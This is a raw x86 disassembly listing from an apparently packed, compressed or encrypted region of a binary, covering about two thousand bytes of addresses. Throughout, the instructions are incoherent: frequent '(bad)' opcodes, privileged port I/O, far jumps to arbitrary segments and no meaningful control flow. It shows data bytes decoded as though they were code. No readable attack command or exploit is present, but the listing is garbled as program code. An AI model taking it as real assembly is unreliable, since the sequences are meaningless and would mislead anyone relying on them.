  416d07:	seto   bl
  416d0a:	in     eax,0x8d
  416d0c:	mov    esp,0x8369b1a4
  416d11:	xchg   esp,eax
  416d12:	inc    esp
  416d13:	cwde   
  416d14:	pop    ss
  416d15:	scas   al,BYTE PTR es:[edi]
  416d16:	adc    BYTE PTR [esp+edi*4],bh
  416d19:	inc    ecx
  416d1a:	out    0xf9,al
  416d1c:	xor    eax,0x12e74564
  416d21:	mov    ch,ah
  416d23:	push   edx
  416d24:	push   cs
  416d25:	call   0x8806dd9b
  416d2a:	ins    BYTE PTR es:[edi],dx
  416d2b:	ins    DWORD PTR es:[edi],dx
  416d2c:	jmp    0xd4bf:0xfbb93483
  416d33:	jmp    0x8e0ecdd2
  416d38:	jge    0x416d78
  416d3a:	call   0x2185:0x3dd8f795
  416d41:	dec    ebp
  416d42:	and    BYTE PTR [ecx],bh
  416d44:	stos   DWORD PTR es:[edi],eax
  416d45:	bound  ebp,QWORD PTR [ebp-0x4b13e729]
  416d4b:	ror    ebp,0x5a
  416d4e:	test   eax,0xf78ea07c
  416d53:	push   0x2e1b2e1
  416d58:	std    
  416d59:	out    0x63,al
  416d5b:	fidivr DWORD PTR [edx-0x6c]
  416d5e:	xor    al,0xcd
  416d60:	xor    DWORD PTR [esi+ecx*1+0x2],esi
  416d64:	fdivr  DWORD PTR [edx-0x5c]
  416d67:	dec    ecx
  416d68:	cmp    esi,ebp
  416d6a:	xchg   edx,eax
  416d6b:	push   ebp
  416d6c:	jae    0x416da8
  416d6e:	xlat   BYTE PTR ds:[ebx]
  416d6f:	cmp    eax,0x5ed998e1
  416d74:	(bad)  
  416d75:	and    bl,al
  416d77:	rcr    ch,cl
  416d79:	mov    ds:0x20822d4c,al
  416d7e:	fst    DWORD PTR [bx-0x6f]
  416d82:	mov    ebx,0x24caedaa
  416d87:	cmp    bl,bl
  416d89:	icebp  
  416d8a:	fadd   QWORD PTR [ecx-0x66]
  416d8d:	stos   DWORD PTR es:[edi],eax
  416d8e:	inc    ebp
  416d8f:	repz daa 
  416d91:	mov    DWORD PTR [edi],eax
  416d93:	test   BYTE PTR [edx],0xf8
  416d96:	gs lahf 
  416d98:	imul   edi,DWORD PTR [eax+0x34],0x139f0689
  416d9f:	sbb    ecx,DWORD PTR [ebx+edx*8-0x5de9839d]
  416da6:	pop    ss
  416da7:	xchg   BYTE PTR [ebx+ebx*2-0x43],ch
  416dab:	sbb    bh,BYTE PTR [eax-0x1d]
  416dae:	xchg   edx,eax
  416daf:	pop    ds
  416db0:	jmp    0x72f6a11
  416db5:	cmc    
  416db6:	das    
  416db7:	xor    al,0x57
  416db9:	xor    al,0xa3
  416dbb:	and    BYTE PTR [ecx+ebp*1+0x51c0a80b],0xcc
  416dc3:	jp     0x416d82
  416dc5:	xchg   DWORD PTR [ecx-0x6783b099],ebx
  416dcb:	inc    edx
  416dcc:	adc    bl,0x1a
  416dcf:	(bad)  
  416dd0:	xor    DWORD PTR [edx+0x41ae16db],edi
  416dd6:	lahf   
  416dd7:	inc    eax
  416dd8:	sbb    cl,dl
  416dda:	mov    al,ds:0xbdb5255a
  416ddf:	pushf  
  416de0:	cmp    al,0x48
  416de2:	inc    edi
  416de3:	mov    esi,0xc3623bdd
  416de8:	rcr    esp,1
  416dea:	or     BYTE PTR [ecx+0x4d],dh
  416ded:	(bad)  
  416dee:	fcomip st,st(6)
  416df0:	add    BYTE PTR [eax-0x1ae234e3],dl
  416df6:	xchg   ebx,eax
  416df7:	es dec ecx
  416df9:	call   0x4dff:0x20f60bb1
  416e00:	sbb    DWORD PTR [esi-0x44f116e3],eax
  416e06:	ret    
  416e07:	pop    edx
  416e08:	lock pop ds
  416e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e0b:	lds    ebx,FWORD PTR [ebp+0x2338cb84]
  416e11:	jge    0x416e19
  416e13:	xor    BYTE PTR [edi+edi*2+0x491b831c],ch
  416e1a:	mov    esi,0xeef02247
  416e1f:	sub    esp,edx
  416e21:	adc    DWORD PTR [eax],esi
  416e23:	sub    bl,bh
  416e25:	mov    bl,0x32
  416e27:	mov    BYTE PTR [ebx+ebp*8+0x45c5ce16],bl
  416e2e:	or     DWORD PTR [edi+0x7aa48909],ebx
  416e34:	sub    BYTE PTR [ebx-0x7c],0x43
  416e38:	push   0xffffffa5
  416e3a:	out    0xf2,eax
  416e3c:	cmp    DWORD PTR fs:[edx-0x2e],eax
  416e40:	ins    BYTE PTR es:[edi],dx
  416e41:	retf   0x8856
  416e44:	sub    edx,esi
  416e46:	xchg   ebp,eax
  416e47:	ja     0x416dfd
  416e49:	inc    ebp
  416e4a:	iret   
  416e4b:	or     al,0x7f
  416e4d:	pop    ds
  416e4e:	aaa    
  416e4f:	ins    DWORD PTR es:[edi],dx
  416e50:	jp     0x416e47
  416e52:	xor    eax,0x34dc77ad
  416e57:	aas    
  416e58:	imul   edi,DWORD PTR [eax],0x4a
  416e5b:	mov    ebp,0xaf8fb19f
  416e60:	sbb    BYTE PTR [eax-0x46c54d08],al
  416e66:	push   ebp
  416e67:	fwait
  416e68:	retf   0xdc4c
  416e6b:	xchg   ebp,eax
  416e6c:	fcmovb st,st(0)
  416e6e:	jo     0x416e27
  416e70:	ret    0x399d
  416e73:	retf   0x2142
  416e76:	mov    ebp,0xd4706ee2
  416e7b:	rol    BYTE PTR [ecx],cl
  416e7d:	mov    ah,0xe
  416e7f:	mov    dl,0x15
  416e81:	not    DWORD PTR [ebp+0x7f4d6678]
  416e87:	dec    edx
  416e88:	dec    eax
  416e89:	gs xchg esi,eax
  416e8b:	ds push 0x3427fc80
  416e91:	inc    edx
  416e92:	cmp    eax,0x83129c49
  416e97:	pop    ss
  416e98:	sbb    eax,0x59945163
  416e9d:	cdq    
  416e9e:	jg     0x416efd
  416ea0:	dec    edi
  416ea1:	dec    ecx
  416ea2:	mov    ecx,0xe97e5a2e
  416ea7:	dec    eax
  416ea8:	call   0x2bcb0d59
  416ead:	pop    eax
  416eae:	xchg   dh,bh
  416eb0:	(bad)  
  416eb1:	stos   BYTE PTR es:[edi],al
  416eb2:	in     al,dx
  416eb3:	fwait
  416eb4:	dec    ebp
  416eb5:	push   edx
  416eb6:	adc    al,0x60
  416eb8:	clc    
  416eb9:	outs   dx,BYTE PTR ds:[esi]
  416eba:	and    esi,eax
  416ebc:	test   al,0xdb
  416ebe:	fild   QWORD PTR [edi+0x25]
  416ec1:	stos   DWORD PTR es:[edi],eax
  416ec2:	and    DWORD PTR [ebx+0x6b8f1ab4],ecx
  416ec8:	ret    0x181d
  416ecb:	sar    DWORD PTR [edx+0x6257822f],0x71
  416ed2:	push   cs
  416ed3:	push   ecx
  416ed4:	stos   BYTE PTR es:[edi],al
  416ed5:	cmovae ebp,DWORD PTR [edi+edi*2]
  416ed9:	mov    ebp,0xf48f053c
  416ede:	sub    dh,cl
  416ee0:	adc    BYTE PTR [edi+0x4a],ch
  416ee3:	add    eax,0x5467630c
  416ee8:	cld    
  416ee9:	mov    eax,0x41487a8f
  416eee:	xchg   esp,eax
  416eef:	pushf  
  416ef0:	sub    al,0xf8
  416ef2:	adc    al,0xa4
  416ef4:	test   BYTE PTR [ecx+0x75e8d59f],cl
  416efa:	push   0xffffffb4
  416efc:	pop    ss
  416efd:	imul   ebx,DWORD PTR [edi+0x1fc1d2c5],0x575eafe2
  416f07:	(bad)
  416f0a:	mov    al,0x4
  416f0c:	retf   0x3ca5
  416f0f:	push   0x5b
  416f11:	int    0x47
  416f13:	jbe    0x416f90
  416f15:	sahf   
  416f16:	popf   
  416f17:	and    eax,0x60036365
  416f1c:	jmp    0xee47:0x16dc28ce
  416f23:	test   BYTE PTR [ebx+0x30],al
  416f26:	push   edi
  416f27:	fisubr WORD PTR [ebp+0x43]
  416f2a:	and    al,0xf5
  416f2c:	shl    DWORD PTR [edi],0x23
  416f2f:	inc    ebx
  416f30:	stos   DWORD PTR es:[edi],eax
  416f31:	adc    DWORD PTR [ecx+0x23],ecx
  416f34:	fdiv   QWORD PTR [ebx+0x45dec3b5]
  416f3a:	push   esi
  416f3b:	xchg   DWORD PTR [ecx],edx
  416f3d:	sub    ch,0x69
  416f40:	outs   dx,BYTE PTR ds:[esi]
  416f41:	inc    eax
  416f42:	mov    edx,0xee01081f
  416f47:	push   cs
  416f48:	test   eax,0xe9e751fc
  416f4d:	call   0x2c90031d
  416f52:	pop    ss
  416f53:	dec    esp
  416f54:	scas   al,BYTE PTR es:[edi]
  416f55:	lahf   
  416f56:	mov    ds:0xb7a5289a,eax
  416f5b:	out    dx,eax
  416f5c:	fdiv   DWORD PTR [edx-0x2]
  416f5f:	js     0x416fa1
  416f61:	imul   BYTE PTR [edi+0x735297bd]
  416f67:	das    
  416f68:	push   ecx
  416f69:	sub    bh,BYTE PTR [edx]
  416f6b:	ror    al,cl
  416f6d:	xor    BYTE PTR [edi+ecx*1],dh
  416f70:	bt     DWORD PTR [edx-0x39],ecx
  416f74:	dec    edx
  416f75:	adc    DWORD PTR [ecx-0x15],esi
  416f78:	loope  0x416f31
  416f7a:	and    DWORD PTR [ebp+0x198e9684],ecx
  416f80:	or     ecx,DWORD PTR [esi+edx*2]
  416f83:	retf   0x69e0
  416f86:	hlt    
  416f87:	imul   ebp,ebp,0x51
  416f8a:	rcl    BYTE PTR [edx],0xc9
  416f8d:	ins    BYTE PTR es:[edi],dx
  416f8e:	popa   
  416f8f:	or     al,0xa2
  416f91:	adc    eax,0x1743861c
  416f96:	or     DWORD PTR [esi+0x62],ebx
  416f99:	adc    al,0xf5
  416f9b:	xchg   edx,eax
  416f9c:	pop    es
  416f9d:	mov    edi,0x7074d5b0
  416fa2:	repnz push edx
  416fa4:	pop    eax
  416fa5:	inc    esp
  416fa6:	xchg   ecx,eax
  416fa7:	sub    eax,0x43d3fe92
  416fac:	jne    0x417008
  416fae:	or     dh,BYTE PTR [ecx-0x3e]
  416fb1:	mov    ds:0x1ed61fdb,al
  416fb6:	popf   
  416fb7:	lds    ebp,FWORD PTR [ebp+0x18e88e6d]
  416fbd:	je     0x417031
  416fbf:	push   es
  416fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fc1:	xchg   esi,eax
  416fc2:	dec    esp
  416fc3:	mov    ebp,0x3b1a8143
  416fc8:	(bad)  
  416fc9:	xchg   esp,eax
  416fca:	imul   edi,DWORD PTR [edx],0xfe2ee99
  416fd0:	and    al,0xe
  416fd2:	push   edi
  416fd3:	mov    eax,0x18c9a792
  416fd8:	jbe    0x416faf
  416fda:	and    ebp,0x2c
  416fdd:	aam    0xa2
  416fdf:	mov    edx,0x7cd9a2d4
  416fe4:	jno    0x417025
  416fe6:	ret    
  416fe7:	mov    ah,BYTE PTR [ecx+0x46214ca6]
  416fed:	mov    ah,0xee
  416fef:	fucomip st,st(3)
  416ff1:	stos   DWORD PTR es:[edi],eax
  416ff2:	add    DWORD PTR [ebx-0x8],edi
  416ff5:	cmc    
  416ff6:	addr16 mov esi,0xaec8d13
  416ffc:	mov    ah,0x77
  416ffe:	jno    0x416fec
  417000:	push   eax
  417001:	jo     0x417042
  417003:	jmp    0xbd97225b
  417008:	popf   
  417009:	mov    dl,0xbc
  41700b:	rcl    BYTE PTR [esi+0x42],cl
  41700e:	mov    edi,0x1c277bea
  417013:	fisub  WORD PTR [ecx-0x1e54c162]
  417019:	mov    WORD PTR [ebp+0x5],?
  41701c:	xchg   esp,eax
  41701d:	sub    eax,0x793fcc28
  417022:	ss mov ch,0xf
  417025:	mov    esp,0x1f749b23
  41702a:	scas   eax,DWORD PTR es:[edi]
  41702b:	ror    DWORD PTR [ebx+0x561e09a],cl
  417031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417032:	sbb    DWORD PTR ds:0x8ff06007,edx
  417038:	and    DWORD PTR [edi],esi
  41703a:	mov    al,ds:0x1ec96c0a
  41703f:	movups xmm7,XMMWORD PTR [ebx+0x65]
  417043:	pop    esp
  417044:	or     eax,0x907910dc
  417049:	mov    ah,0x1c
  41704b:	fnsave [ecx]
  41704d:	cmp    bl,BYTE PTR [ebx+0x39f7d496]
  417053:	fldenv [ebx-0x47d91b91]
  417059:	es test bh,dh
  41705c:	mov    dl,0xf9
  41705e:	mov    esp,0x90ae208c
  417063:	push   eax
  417064:	dec    ecx
  417065:	pop    edx
  417066:	xchg   ebx,eax
  417067:	sub    esi,ecx
  417069:	push   eax
  41706a:	sahf   
  41706b:	jae    0x41702e
  41706d:	sub    al,0x6d
  41706f:	and    DWORD PTR [bx+di],esi
  417072:	in     al,0xd
  417074:	ror    BYTE PTR [edi-0x7b0becaa],0xe4
  41707b:	add    DWORD PTR [eax+0x6f],ecx
  41707e:	in     eax,dx
  41707f:	retf   
  417080:	das    
  417081:	lahf   
  417082:	jg     0x4170f7
  417084:	int3   
  417085:	mov    eax,ebx
  417087:	lods   eax,DWORD PTR ds:[esi]
  417088:	or     eax,0xa9df91c8
  41708d:	cmp    bh,BYTE PTR [esi-0x7f401202]
  417093:	(bad)  
  417094:	cmp    dh,BYTE PTR ds:0x3fd419fa
  41709a:	xor    esp,ebp
  41709c:	(bad)  
  41709d:	rol    BYTE PTR [edx+0x5],0x45
  4170a1:	add    eax,DWORD PTR [ebx-0x63]
  4170a4:	dec    edx
  4170a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170a6:	invd   
  4170a8:	or     DWORD PTR [ebx],ebx
  4170aa:	out    0x83,eax
  4170ac:	push   0xffffffe2
  4170ae:	mov    edx,0xeee53ec0
  4170b3:	push   edx
  4170b4:	pop    es
  4170b5:	xchg   esp,eax
  4170b6:	cld    
  4170b7:	mov    dh,BYTE PTR [eax]
  4170b9:	fdivr  DWORD PTR [edi-0x4f]
  4170bc:	dec    eax
  4170bd:	inc    ebx
  4170be:	ins    BYTE PTR es:[edi],dx
  4170bf:	push   0x3e537aa8
  4170c4:	dec    esp
  4170c5:	cdq    
  4170c6:	mov    dh,al
  4170c8:	mov    dh,0x3
  4170ca:	retf   0x7586
  4170cd:	(bad)  
  4170ce:	addr16 adc al,0x44
  4170d1:	stos   DWORD PTR es:[edi],eax
  4170d2:	mov    ebx,0x3142848f
  4170d7:	mov    cl,BYTE PTR [ecx+0x1f]
  4170da:	pop    ds
  4170db:	sub    eax,DWORD PTR [esi]
  4170dd:	shr    DWORD PTR [ecx-0x336fe9fe],cl
  4170e3:	and    DWORD PTR [edx-0x360e8353],edx
  4170e9:	ins    BYTE PTR es:[edi],dx
  4170ea:	out    dx,al
  4170eb:	maskmovq mm6,mm3
  4170ee:	xor    ebx,ebx
  4170f0:	loopne 0x417137
  4170f2:	push   esp
  4170f3:	pop    ecx
  4170f4:	rol    BYTE PTR [ebx+0x54],1
  4170f7:	pop    edi
  4170f8:	dec    eax
  4170f9:	jge    0x417112
  4170fb:	add    bh,bl
  4170fd:	jge    0x41710a
  4170ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417100:	adc    al,0x47
  417102:	(bad)  
  417103:	icebp  
  417104:	rcl    BYTE PTR [ebp-0xb],0x44
  417108:	nop
  417109:	jae    0x417127
  41710b:	xchg   ebp,eax
  41710c:	les    ebx,FWORD PTR [esi+0x28]
  41710f:	add    BYTE PTR [esi+0xf345889],ah
  417115:	aas    
  417116:	daa    
  417117:	lock jl 0x4170ed
  41711a:	sti    
  41711b:	inc    ebp
  41711c:	into   
  41711d:	scas   eax,DWORD PTR es:[edi]
  41711e:	jg     0x4170d9
  417120:	les    edi,FWORD PTR [ecx+0x29]
  417123:	mov    ecx,0xaa108a5f
  417128:	pop    edi
  417129:	mov    ch,0x16
  41712b:	pop    ebp
  41712c:	daa    
  41712d:	or     edx,DWORD PTR [ecx+ebx*4+0x2e33b7e7]
  417134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417135:	dec    esi
  417136:	nop
  417137:	sbb    al,0x73
  417139:	mov    bh,ah
  41713b:	xchg   ecx,eax
  41713c:	add    DWORD PTR [ebx-0xdac4ad6],edi
  417142:	push   es
  417143:	mov    ebp,esi
  417145:	cdq    
  417146:	push   eax
  417147:	sbb    esp,DWORD PTR [ecx+0x48618971]
  41714d:	leave  
  41714e:	loop   0x41710d
  417150:	inc    edx
  417151:	dec    ecx
  417152:	or     al,0x18
  417154:	addr16 mov bl,0xee
  417157:	push   es
  417158:	ins    DWORD PTR es:[edi],dx
  417159:	inc    ecx
  41715a:	cmp    eax,0x9ca61daa
  41715f:	dec    ecx
  417160:	clc    
  417161:	dec    ebx
  417162:	mov    bl,0x21
  417164:	dec    edx
  417165:	jns    0x417177
  417167:	fmul   DWORD PTR [di-0x3211]
  41716c:	jbe    0x417154
  41716e:	cwde   
  41716f:	xor    eax,0xc25f8bc3
  417174:	popf   
  417175:	jbe    0x417112
  417177:	push   edi
  417178:	push   eax
  417179:	fs int 0x59
  41717c:	pop    ecx
  41717d:	xchg   esi,esi
  41717f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417180:	adc    ah,BYTE PTR [esi+0xead79bd]
  417186:	jbe    0x41710a
  417188:	inc    ebp
  417189:	lods   al,BYTE PTR ds:[esi]
  41718a:	and    eax,0x91b9f571
  41718f:	push   0xffffffac
  417191:	fst    st(4)
  417193:	fmul   QWORD PTR [edx-0x38]
  417196:	loope  0x4171b9
  417198:	mov    dl,0x9d
  41719a:	cmp    edi,DWORD PTR [ebp+0x9ea1945]
  4171a0:	mov    eax,0xedacdc43
  4171a5:	lods   al,BYTE PTR ds:[esi]
  4171a6:	push   eax
  4171a7:	xchg   DWORD PTR [ebp-0x56187c93],edx
  4171ad:	aaa    
  4171ae:	push   ecx
  4171af:	retf   0xe076
  4171b2:	add    eax,0xf0b14edb
  4171b7:	das    
  4171b8:	jmp    0x9e79:0x7fa35efe
  4171bf:	sbb    al,BYTE PTR [ebx]
  4171c1:	retf   0xc11e
  4171c4:	inc    DWORD PTR [edx]
  4171c6:	fstp   QWORD PTR [edi-0x7e]
  4171c9:	xchg   ebx,eax
  4171ca:	rcr    bh,cl
  4171cc:	jo     0x4171f9
  4171ce:	push   ds
  4171cf:	shr    ebp,0x1d
  4171d2:	jg     0x417176
  4171d4:	inc    eax
  4171d5:	cmp    bh,BYTE PTR [ebx-0x1c]
  4171d8:	push   ebp
  4171d9:	mov    ebx,DWORD PTR [ebx+ecx*2]
  4171dc:	repz mov ecx,0xba2f62e9
  4171e2:	mov    ecx,cs
  4171e4:	add    DWORD PTR [esi-0x5e75507a],ebp
  4171ea:	mov    eax,ds:0x24e8d68d
  4171ef:	xchg   edi,eax
  4171f0:	pop    ecx
  4171f1:	add    eax,edi
  4171f3:	pop    esi
  4171f4:	arpl   WORD PTR [ebp+0x29],bx
  4171f7:	inc    ecx
  4171f8:	adc    al,0xae
  4171fa:	xchg   edx,eax
  4171fb:	pop    ds
  4171fc:	retf   
  4171fd:	mov    eax,ds:0x5a19a2fe
  417202:	in     eax,0x59
  417204:	int3   
  417205:	clc    
  417206:	shr    ah,cl
  417208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417209:	shl    DWORD PTR [ebx+0x44b02b8a],cl
  41720f:	call   0xafd2187f
  417214:	adc    DWORD PTR [edi],0x9787f927
  41721a:	adc    DWORD PTR [edx-0x1636731a],eax
  417220:	in     eax,dx
  417221:	je     0x41721d
  417223:	adc    BYTE PTR [edi+0x3218c136],0xe3
  41722a:	js     0x41720e
  41722c:	lock fadd st(5),st
  41722f:	xor    ecx,DWORD PTR [edx+0x60]
  417232:	mov    bl,0x22
  417234:	stos   DWORD PTR es:[edi],eax
  417235:	pop    esi
  417236:	(bad)  
  417237:	(bad)  
  417238:	in     eax,0x64
  41723a:	mov    esp,0x1dbfd5d4
  41723f:	sbb    DWORD PTR [eax+0x72f56526],ebx
  417245:	aam    0x94
  417247:	jo     0x4172be
  417249:	lock cdq 
  41724b:	push   ds
  41724c:	mov    dl,0xdb
  41724e:	fbld   TBYTE PTR [edx+0x16e36fa6]
  417254:	aam    0xca
  417256:	test   DWORD PTR [edi-0x55],ebx
  417259:	mov    ecx,0x15c3c2fb
  41725e:	nop
  41725f:	jl     0x417274
  417261:	mov    ebp,0x5774244a
  417266:	out    dx,al
  417267:	adc    DWORD PTR [ecx+0x46],ebp
  41726a:	cmp    DWORD PTR [ecx],eax
  41726c:	cli    
  41726d:	aas    
  41726e:	mov    ah,0xe8
  417270:	sub    al,bl
  417272:	pop    edx
  417273:	xchg   ebx,eax
  417274:	xchg   ecx,eax
  417275:	add    BYTE PTR ds:0x8d30,ah
  41727a:	push   0xec1cd91b
  41727f:	mov    eax,0xb3917c0c
  417284:	xchg   ecx,eax
  417285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417286:	cmp    al,0xb2
  417288:	xchg   edx,eax
  417289:	cmp    al,0xbc
  41728b:	dec    ebp
  41728c:	and    ecx,ebp
  41728e:	push   0x358a2ce5
  417293:	mov    edx,0xe204a047
  417298:	in     al,dx
  417299:	sbb    dh,BYTE PTR [edi]
  41729b:	jmp    0xd392:0xf906fde
  4172a2:	(bad)  [edi-0x5]
  4172a5:	mov    ecx,0x750df067
  4172aa:	lods   al,BYTE PTR ds:[esi]
  4172ab:	push   fs
  4172ad:	sti    
  4172ae:	inc    eax
  4172af:	das    
  4172b0:	or     cl,BYTE PTR [edx-0x56]
  4172b3:	mov    dl,0xa1
  4172b5:	stos   BYTE PTR es:[edi],al
  4172b6:	cmp    BYTE PTR [edi+ebp*1],dh
  4172b9:	jmp    0xb5e3:0x2e5a5935
  4172c0:	xchg   esi,eax
  4172c1:	mov    ebx,0xebfb8760
  4172c6:	gs xchg cl,bl
  4172c9:	in     al,dx
  4172ca:	and    BYTE PTR [eax],bh
  4172cc:	sbb    DWORD PTR [ecx-0x48],esi
  4172cf:	stos   BYTE PTR es:[edi],al
  4172d0:	fbstp  TBYTE PTR [edx+0x6b]
  4172d3:	clc    
  4172d4:	mov    ah,0x5f
  4172d6:	scas   eax,DWORD PTR es:[edi]
  4172d7:	ja     0x4172ef
  4172d9:	sub    eax,DWORD PTR [esi-0x3d]
  4172dc:	in     eax,dx
  4172dd:	sbb    al,0xb4
  4172df:	fadd   st(2),st
  4172e1:	aas    
  4172e2:	mov    ds:0x2f5710cd,eax
  4172e7:	lods   eax,DWORD PTR ds:[esi]
  4172e8:	in     eax,dx
  4172e9:	(bad)  
  4172ea:	cmp    al,BYTE PTR [ebp-0x9]
  4172ed:	loope  0x4172c6
  4172ef:	mov    esp,0xf27c8425
  4172f4:	push   es
  4172f5:	push   esi
  4172f6:	stos   DWORD PTR es:[edi],eax
  4172f7:	adc    eax,0x6db486b9
  4172fc:	push   cs
  4172fd:	mov    edx,DWORD PTR [eax+0x7a]
  417300:	ficomp DWORD PTR [esi+0x42]
  417303:	inc    esp
  417304:	movlps QWORD PTR [edi],xmm4
  417307:	adc    al,0xc8
  417309:	jne    0x4172e5
  41730b:	out    dx,al
  41730c:	inc    edi
  41730d:	popf   
  41730e:	cmp    esi,DWORD PTR [edx-0x80]
  417311:	aam    0x20
  417313:	fcom   DWORD PTR [ebx-0x2ff681e7]
  417319:	call   0xc8ab6938
  41731e:	jo     0x417381
  417320:	popf   
  417321:	mov    ebp,0xf5534c23
  417326:	xor    DWORD PTR [edx+0x41a6398e],edx
  41732c:	aas    
  41732d:	in     eax,dx
  41732e:	xor    ch,BYTE PTR [eax-0x74]
  417331:	les    edx,FWORD PTR [esi-0x17ff042c]
  417337:	jmp    0x417377
  417339:	adc    ebp,DWORD PTR [ecx+0x19f159ae]
  41733f:	mov    ebx,0x97a3bdff
  417344:	(bad)  
  417345:	(bad)  
  417346:	fnsave [ebx+0x4330d8ab]
  41734c:	jae    0x417360
  41734e:	test   BYTE PTR ds:0x21ec76cf,cl
  417354:	sbb    dh,al
  417356:	sti    
  417357:	leave  
  417358:	sub    BYTE PTR [ebp+0x5f0378f0],al
  41735e:	xchg   esp,eax
  41735f:	xchg   esp,eax
  417360:	push   edi
  417361:	mov    al,0x52
  417363:	leave  
  417364:	bound  edi,QWORD PTR [edx+0x35]
  417367:	outs   dx,BYTE PTR ds:[esi]
  417368:	out    dx,eax
  417369:	rcr    DWORD PTR [ecx-0x4e],cl
  41736c:	mov    ss,WORD PTR [ebx+eax*2]
  41736f:	pushf  
  417370:	dec    DWORD PTR [ebx-0x2db6e2f6]
  417376:	outs   dx,DWORD PTR ds:[esi]
  417377:	scas   al,BYTE PTR es:[edi]
  417378:	test   BYTE PTR [ebx-0x7fe5a53b],ch
  41737e:	push   esi
  41737f:	ins    BYTE PTR es:[edi],dx
  417380:	push   0xead1ef44
  417385:	xchg   esi,eax
  417386:	ret    
  417387:	in     eax,0xfb
  417389:	mov    ?,WORD PTR [edx+0x6b]
  41738c:	fmul   DWORD PTR [edi+esi*8-0x3e3a174f]
  417393:	and    al,0x41
  417395:	jb     0x4173bd
  417397:	jne    0x4173e4
  417399:	mov    esi,0x92e2b8b8
  41739e:	cmp    al,0xb5
  4173a0:	adc    al,0x4
  4173a2:	loop   0x4173d1
  4173a4:	out    0xf7,al
  4173a6:	add    BYTE PTR [ebx],bh
  4173a8:	add    edx,ecx
  4173aa:	xor    esi,DWORD PTR [ebx+0x63b189fc]
  4173b0:	mov    BYTE PTR [edx-0x732a3e5b],bl
  4173b6:	or     ebp,DWORD PTR [eax-0x56]
  4173b9:	pop    ebx
  4173ba:	retf   
  4173bb:	daa    
  4173bc:	sbb    bh,BYTE PTR [edx+edx*1-0x13]
  4173c0:	ss out dx,eax
  4173c2:	pop    fs
  4173c4:	dec    ebp
  4173c5:	stos   BYTE PTR es:[edi],al
  4173c6:	sub    DWORD PTR [ebx+0x3ee7f894],ecx
  4173cc:	rcr    BYTE PTR [edi],cl
  4173ce:	add    eax,0x9dd5c40
  4173d3:	xchg   BYTE PTR [ebx+ebp*8-0x72],ah
  4173d7:	jo     0x4173b3
  4173d9:	sahf   
  4173da:	pop    es
  4173db:	(bad)  
  4173dd:	rol    BYTE PTR [eax],cl
  4173df:	cmp    ch,dh
  4173e1:	mov    ecx,0x6ee9147b
  4173e6:	and    esi,DWORD PTR [ecx-0x669fda1e]
  4173ec:	mov    BYTE PTR [esp+ebx*4+0xc],al
  4173f0:	fstp   DWORD PTR [eax-0x17]
  4173f3:	fstp   DWORD PTR ds:0xb9bcbf9c
  4173f9:	retf   
  4173fa:	pushf  
  4173fb:	rol    DWORD PTR [ebx+0x1a64652d],1
  417401:	in     al,dx
  417402:	ror    DWORD PTR [esi-0x7012881a],0xe2
  417409:	shl    DWORD PTR [edx+0x44],1
  41740c:	adc    dl,BYTE PTR [edx+0x5b424723]
  417412:	test   al,0xa7
  417414:	push   esp
  417415:	push   edx
  417416:	push   ebx
  417417:	mov    DWORD PTR ds:0xb2df0d8d,esp
  41741d:	pop    esp
  41741e:	adc    DWORD PTR [ebx+edx*4+0x18],ebx
  417422:	bound  edx,QWORD PTR [ebx-0x6d]
  417425:	mov    ebx,eax
  417427:	outs   dx,BYTE PTR ds:[esi]
  417428:	inc    edi
  417429:	gs mov bh,0xd6
  41742c:	stc    
  41742d:	(bad)  
  41742e:	xchg   ebp,eax
  41742f:	daa    
  417430:	pushf  
  417431:	(bad)  
  417432:	cmp    dh,BYTE PTR [eax+eax*1-0x6f]
  417436:	and    DWORD PTR [ebp+0x51],esi
  417439:	mov    BYTE PTR [ebx],al
  41743b:	ins    BYTE PTR es:[edi],dx
  41743c:	shl    BYTE PTR [eax+0x3a9a3404],cl
  417442:	sti    
  417443:	retf   0xa4d7
  417446:	popa   
  417447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417448:	out    0xa1,eax
  41744a:	xchg   edx,eax
  41744b:	ret    
  41744c:	ss dec ebx
  41744e:	or     ch,BYTE PTR [esi+0x19]
  417451:	mov    cl,0xd1
  417453:	jge    0x4174cd
  417455:	(bad)  
  417456:	loopne 0x4173fb
  417458:	adc    DWORD PTR [ebx-0x43595fdf],eax
  41745e:	into   
  41745f:	aaa    
  417460:	cmp    eax,0xdf2c325a
  417465:	add    dh,dh
  417467:	mov    eax,ds:0xb44eb8a4
  41746c:	retf   
  41746d:	sub    eax,0xf2918eb
  417472:	and    eax,0xbedbf263
  417477:	adc    al,0x60
  417479:	test   al,0xe0
  41747b:	(bad)  
  41747c:	or     al,0x16
  41747e:	dec    ecx
  41747f:	xlat   BYTE PTR ds:[ebx]
  417480:	int    0xec
  417482:	sub    ch,BYTE PTR [ebx]
  417484:	xchg   ebp,eax
  417485:	in     eax,dx
  417486:	arpl   bp,di
  417488:	aaa    
  417489:	mov    bl,0xc
  41748b:	pop    ebx
  41748c:	ret    
  41748d:	enter  0xac22,0x94
  417491:	outs   dx,DWORD PTR ds:[esi]
  417492:	fbstp  TBYTE PTR [ecx-0x3f]
  417495:	fidivr DWORD PTR [ebx+0x75]
  417498:	mov    edx,0x209995b
  41749d:	pop    es
  41749e:	jle    0x417471
  4174a0:	pop    ecx
  4174a1:	adc    al,0xa9
  4174a4:	mov    dh,0xb0
  4174a6:	or     bh,dh
  4174a8:	iret   
  4174a9:	push   cs
  4174aa:	push   ds
  4174ab:	loopne 0x417522
  4174ad:	and    ebx,DWORD PTR [edi]
  4174af:	mov    ebp,0xa5c3dd2
  4174b4:	stos   BYTE PTR es:[edi],al
  4174b5:	add    eax,0xca3a11a6
  4174ba:	cmp    bh,BYTE PTR [ecx-0x2e1759ea]
  4174c0:	les    edx,FWORD PTR [ebp+0xf5a03ca]
  4174c6:	inc    edx
  4174c7:	das    
  4174c8:	xor    eax,0xbfef8be7
  4174cd:	jb     0x41745c
  4174cf:	test   al,0x78
  4174d1:	dec    ecx
  4174d2:	jp     0x417549
  4174d4:	lock jg 0x417474
